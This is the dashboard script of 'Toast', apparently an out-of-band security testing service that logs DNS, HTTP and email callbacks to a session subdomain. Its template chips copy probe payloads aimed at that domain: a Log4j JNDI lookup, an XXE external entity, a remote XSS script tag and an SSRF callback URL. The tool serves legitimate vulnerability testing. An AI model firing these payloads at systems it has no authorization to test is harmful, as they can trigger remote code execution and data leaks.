// Toast - Dashboard Script

document.addEventListener('DOMContentLoaded', () => {
  let sessionToken = localStorage.getItem('toast_token');
  let payloadId = localStorage.getItem('toast_subdomain');
  let interactions = [];
  let currentFilter = 'all';
  let selectedLogId = null;
  let sseSource = null;
  let pollInterval = null;

  const subdomainDisplay = document.getElementById('subdomainDisplay');
  const sessionTokenDisplay = document.getElementById('sessionTokenDisplay');
  const interactionCount = document.getElementById('interactionCount');
  const statusBadge = document.getElementById('statusBadge');
  const logList = document.getElementById('logList');
  const emptyState = document.getElementById('emptyState');
  
  const detailPanel = document.getElementById('detailPanel');
  const detailEmpty = document.getElementById('detailEmpty');
  const detailContent = document.getElementById('detailContent');
  
  const detailTypeBadge = document.getElementById('detailTypeBadge');
  const detailTitle = document.getElementById('detailTitle');
  const detailTime = document.getElementById('detailTime');
  const detailIp = document.getElementById('detailIp');
  const detailProtocol = document.getElementById('detailProtocol');
  const detailGeo = document.getElementById('detailGeo');
  const detailPayloadId = document.getElementById('detailPayloadId');
  const rawOutput = document.getElementById('rawOutput');
  const parsedOutput = document.getElementById('parsedOutput');

  const newSessionBtn = document.getElementById('newSessionBtn');
  const copySubdomainBtn = document.getElementById('copySubdomainBtn');
  const clearLogsBtn = document.getElementById('clearLogsBtn');
  const mockSettingsBtn = document.getElementById('mockSettingsBtn');
  const copyRawBtn = document.getElementById('copyRawBtn');

  const mockModal = document.getElementById('mockModal');
  const closeMockModal = document.getElementById('closeMockModal');
  const cancelMockBtn = document.getElementById('cancelMockBtn');
  const saveMockBtn = document.getElementById('saveMockBtn');
  const mockStatus = document.getElementById('mockStatus');
  const mockHeaders = document.getElementById('mockHeaders');
  const mockBody = document.getElementById('mockBody');
  const mockDnsTxt = document.getElementById('mockDnsTxt');

  init();

  async function init() {
    setupEventListeners();
    if (!sessionToken || !payloadId) {
      await createNewSession();
    } else {
      updateSubdomainUI(payloadId);
      startLiveStream();
    }
  }

  async function createNewSession() {
    try {
      statusBadge.textContent = 'Connecting...';
      const res = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: 'Web Session' })
      });
      const data = await res.json();
      if (data.success) {
        sessionToken = data.token;
        payloadId = data.subdomain;
        localStorage.setItem('toast_token', sessionToken);
        localStorage.setItem('toast_subdomain', payloadId);
        
        interactions = [];
        selectedLogId = null;
        renderLogs();
        updateSubdomainUI(payloadId);
        startLiveStream();
      } else {
        alert('Session error: ' + data.error);
      }
    } catch (e) {
      statusBadge.textContent = 'Offline';
    }
  }

  function updateSubdomainUI(sub) {
    const currentHost = window.location.host;
    let fullSubdomain = `${sub}.${currentHost}`;
    
    if (currentHost.includes('localhost') || currentHost.includes('127.0.0.1')) {
      fullSubdomain = `${sub}.oast.local`;
    }

    subdomainDisplay.textContent = fullSubdomain;
    sessionTokenDisplay.textContent = `Token: ${sessionToken.substring(0, 10)}...`;
    statusBadge.textContent = 'Live';
    statusBadge.className = 'badge badge-light';
  }

  function startLiveStream() {
    if (sseSource) sseSource.close();
    if (pollInterval) clearInterval(pollInterval);

    try {
      const sseUrl = `/api/stream?token=${encodeURIComponent(sessionToken)}`;
      sseSource = new EventSource(sseUrl);

      sseSource.addEventListener('connected', () => {
        statusBadge.textContent = 'Live SSE';
      });

      sseSource.addEventListener('interaction', (e) => {
        try {
          const item = JSON.parse(e.data);
          addInteraction(item);
        } catch (err) {}
      });

      sseSource.onerror = () => {
        statusBadge.textContent = 'Polling';
        sseSource.close();
        startPolling();
      };
    } catch (e) {
      startPolling();
    }
  }

  function startPolling() {
    fetchLogs();
    pollInterval = setInterval(fetchLogs, 2500);
  }

  async function fetchLogs() {
    if (!sessionToken) return;
    try {
      const lastId = interactions.length > 0 ? Math.max(...interactions.map(i => i.id)) : 0;
      const res = await fetch(`/api/poll?token=${encodeURIComponent(sessionToken)}&since_id=${lastId}`);
      const data = await res.json();
      if (data.success && data.interactions.length > 0) {
        data.interactions.forEach(addInteraction);
      }
    } catch (e) {}
  }

  function addInteraction(item) {
    if (interactions.some(existing => existing.id === item.id)) return;
    interactions.unshift(item);
    interactionCount.textContent = `${interactions.length} interactions`;
    renderLogs();
  }

  function renderLogs() {
    const filtered = interactions.filter(item => {
      if (currentFilter === 'all') return true;
      return item.type?.toLowerCase() === currentFilter;
    });

    if (filtered.length === 0) {
      emptyState.classList.remove('hidden');
      logList.innerHTML = '';
      logList.appendChild(emptyState);
      return;
    }

    emptyState.classList.add('hidden');
    logList.innerHTML = '';

    filtered.forEach(item => {
      const el = document.createElement('div');
      el.className = `log-item ${item.id === selectedLogId ? 'selected' : ''}`;
      
      const badgeClass = `badge-${item.type?.toLowerCase() || 'http'}`;
      const titleText = item.type === 'dns' 
        ? `${item.method || 'A'} Query` 
        : item.type === 'email' 
          ? `EMAIL (${item.parsed_data?.sender || 'SMTP'})` 
          : `${item.method || 'GET'} ${item.parsed_data?.path || '/'}`;

      const timeStr = new Date(item.created_at || Date.now()).toLocaleTimeString();

      el.innerHTML = `
        <div class="log-main">
          <span class="badge ${badgeClass}">${item.type || 'HTTP'}</span>
          <div>
            <div class="log-title">${escapeHtml(titleText)}</div>
            <div class="log-sub">${escapeHtml(item.source_ip || '0.0.0.0')} • ${escapeHtml(item.geolocation || 'Unknown')}</div>
          </div>
        </div>
        <div class="log-time">${timeStr}</div>
      `;

      el.addEventListener('click', () => selectLogItem(item.id));
      logList.appendChild(el);
    });
  }

  function selectLogItem(id) {
    selectedLogId = id;
    renderLogs();

    const item = interactions.find(i => i.id === id);
    if (!item) return;

    detailEmpty.classList.add('hidden');
    detailContent.classList.remove('hidden');

    detailTypeBadge.textContent = (item.type || 'HTTP').toUpperCase();
    detailTypeBadge.className = `badge badge-${item.type?.toLowerCase() || 'http'}`;
    
    detailTitle.textContent = item.type === 'dns' 
      ? `DNS ${item.method || 'A'} ${item.full_domain || ''}`
      : item.type === 'email'
        ? `EMAIL ${item.parsed_data?.subject || ''}`
        : `${item.method || 'GET'} ${item.parsed_data?.path || '/'}`;

    detailTime.textContent = new Date(item.created_at || Date.now()).toLocaleString();
    detailIp.textContent = item.source_ip || '0.0.0.0';
    detailProtocol.textContent = item.protocol || 'HTTP/1.1';
    detailGeo.textContent = item.geolocation || 'Unknown';
    detailPayloadId.textContent = item.payload_id || payloadId;

    rawOutput.textContent = item.raw_data || JSON.stringify(item, null, 2);
    parsedOutput.textContent = JSON.stringify(item.parsed_data || item, null, 2);
  }

  function setupEventListeners() {
    newSessionBtn.addEventListener('click', createNewSession);

    copySubdomainBtn.addEventListener('click', () => {
      copyToClipboard(subdomainDisplay.textContent);
      copySubdomainBtn.textContent = 'Copied';
      setTimeout(() => copySubdomainBtn.textContent = 'Copy Domain', 1800);
    });

    clearLogsBtn.addEventListener('click', async () => {
      if (!confirm('Clear interaction logs?')) return;
      await fetch(`/api/clear?token=${encodeURIComponent(sessionToken)}`, { method: 'DELETE' });
      interactions = [];
      selectedLogId = null;
      interactionCount.textContent = '0 interactions';
      detailContent.classList.add('hidden');
      detailEmpty.classList.remove('hidden');
      renderLogs();
    });

    copyRawBtn.addEventListener('click', () => {
      copyToClipboard(rawOutput.textContent);
      copyRawBtn.textContent = 'Copied';
      setTimeout(() => copyRawBtn.textContent = 'Copy Raw', 1500);
    });

    document.querySelectorAll('.filter-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        currentFilter = btn.dataset.filter;
        renderLogs();
      });
    });

    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if (btn.dataset.tab === 'raw') {
          document.getElementById('tabRaw').classList.remove('hidden');
          document.getElementById('tabParsed').classList.add('hidden');
        } else {
          document.getElementById('tabRaw').classList.add('hidden');
          document.getElementById('tabParsed').classList.remove('hidden');
        }
      });
    });

    document.querySelectorAll('.chip').forEach(chip => {
      chip.addEventListener('click', () => {
        const type = chip.dataset.template;
        const domain = subdomainDisplay.textContent;
        let textToCopy = domain;

        switch (type) {
          case 'subdomain': textToCopy = domain; break;
          case 'http': textToCopy = `http://${domain}`; break;
          case 'log4j': textToCopy = `\${jndi:ldap://${domain}/a}`; break;
          case 'ssrf': textToCopy = `http://${domain}/ssrf-callback`; break;
          case 'xxe': textToCopy = `<!ENTITY % d SYSTEM "http://${domain}/xxe.dtd">%d;`; break;
          case 'xss': textToCopy = `<script src="http://${domain}/xss.js"></script>`; break;
          case 'email': textToCopy = `test@${domain}`; break;
        }

        copyToClipboard(textToCopy);
        const original = chip.textContent;
        chip.textContent = 'Copied';
        setTimeout(() => chip.textContent = original, 1500);
      });
    });

    mockSettingsBtn.addEventListener('click', async () => {
      mockModal.classList.remove('hidden');
      const res = await fetch(`/api/mock?token=${encodeURIComponent(sessionToken)}`);
      const data = await res.json();
      if (data.mock) {
        mockStatus.value = data.mock.http_status;
        mockHeaders.value = data.mock.http_headers;
        mockBody.value = data.mock.http_body;
        mockDnsTxt.value = data.mock.dns_txt;
      }
    });

    closeMockModal.addEventListener('click', () => mockModal.classList.add('hidden'));
    cancelMockBtn.addEventListener('click', () => mockModal.classList.add('hidden'));

    saveMockBtn.addEventListener('click', async () => {
      const payload = {
        http_status: mockStatus.value,
        http_headers: mockHeaders.value,
        http_body: mockBody.value,
        dns_txt: mockDnsTxt.value
      };

      await fetch(`/api/mock?token=${encodeURIComponent(sessionToken)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      mockModal.classList.add('hidden');
    });
  }

  function copyToClipboard(text) {
    navigator.clipboard.writeText(text).catch(() => {
      const input = document.createElement('input');
      input.value = text;
      document.body.appendChild(input);
      input.select();
      document.execCommand('copy');
      document.body.removeChild(input);
    });
  }

  function escapeHtml(str) {
    return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }
});
